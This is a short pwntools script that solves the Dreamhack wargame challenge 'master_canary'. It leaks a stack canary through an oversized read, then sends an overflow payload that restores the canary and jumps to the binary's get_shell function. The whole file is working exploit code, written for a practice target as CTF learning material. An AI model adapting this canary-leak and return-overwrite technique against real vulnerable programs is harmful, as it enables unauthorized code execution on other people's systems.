#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("master_canary")

local = True 
if local:
    p = process("./master_canary")
    #gdb.attach(p,'''b*0x0000000000400b32\nc\nb*0x0000000000400b32''')
else:
    p = remote('host3.dreamhack.games', 22506)

elf = context.binary = ELF('./master_canary', checksec=False)

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

###############
# Leak canary #
###############

sla(b'>', b'1')
sleep(0.2)
sla(b'>', b'2')
sla(b'Size:', str(0x929))
sla(b'Data:', b'a'*0x928)
p.recvuntil(b'a'*0x928+b'\n')
canary = int.from_bytes(p.recv(7), 'little') << 8
info(hex(canary))

#############
# get shell #
#############
ret = 0x00000000004007e1

payload = b'A' * 40
payload += p64(canary)
payload += b'B' * 8
payload += p64(elf.symbols['get_shell']+1)
sla(b'>', b'3')
sla(b'Leave comment: ', payload)

p.interactive()